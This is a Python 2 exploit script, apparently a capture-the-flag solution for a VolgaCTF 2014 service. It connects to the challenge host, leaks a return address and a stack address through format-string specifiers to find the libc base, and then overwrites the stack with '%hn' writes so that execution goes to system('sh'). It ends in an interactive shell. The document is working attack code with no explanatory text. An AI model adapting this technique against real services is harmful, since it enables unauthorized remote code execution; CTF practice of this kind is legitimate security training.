import socket
import struct
import time
import telnetlib
import string

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='=='):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

#host = '202.120.7.111'
host = 'tasks.2014.volgactf.ru'
port = 28114

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

f.write("1\n")

py = "%87$x==\n"

f.write(py)

print readuntil(f)
main_ret = string.atoi(readuntil(f)[-8:], 16)
libc_base = main_ret - 0x194b3

print hex(libc_base)

copy_addr = libc_base + 0x161b40
exit_addr = libc_base + 0x32f30
system_addr = libc_base + 0x3f430 - 0x1e0
bin_addr = copy_addr - 0x3100 - 0x14

print "exit: " + hex(exit_addr)
print "system: " + hex(system_addr)
print "sh: " + hex(bin_addr)

bin_l = string.atoi(hex(bin_addr)[-4:], 16)
bin_h = string.atoi(hex(bin_addr)[-8:-4], 16) 
sys_l = string.atoi(hex(system_addr)[-4:], 16)
sys_h = string.atoi(hex(system_addr)[-8:-4], 16)

binln = str(bin_l - 16)
print binln
sysln = str(sys_l - bin_l)
print sysln
syshn = str(sys_h - sys_l)
print syshn
binhn = str(bin_h - sys_h)
print binhn

f.write("1\n")

py = f.write("%74$x===\n")

print readuntil(f, "===")
x = readuntil(f, "===")

ToT = string.atoi(x[x.find(":")+1:], 16)
ToT -= 11 * 4

print "ToT:" + hex(ToT)

f.write("1\n")

py = f.write(p(ToT + 8) + p(ToT) + p(ToT + 2) + p(ToT + 10) + "%" + binln + "c%7$hn" + "%" + sysln + "c%8$hn" + "%" + syshn + "c%9$hn" + "%" + binhn + "c%10$hn===\n")
#py = f.write(p(ToT) + "%100c%7$hn===\n")

readuntil(f, "===")
#readuntil(f, "===")

#f.write("echo 1\n")

#while(1):
#	print f.read(4096)

t = telnetlib.Telnet()
t.sock = s
t.interact()






















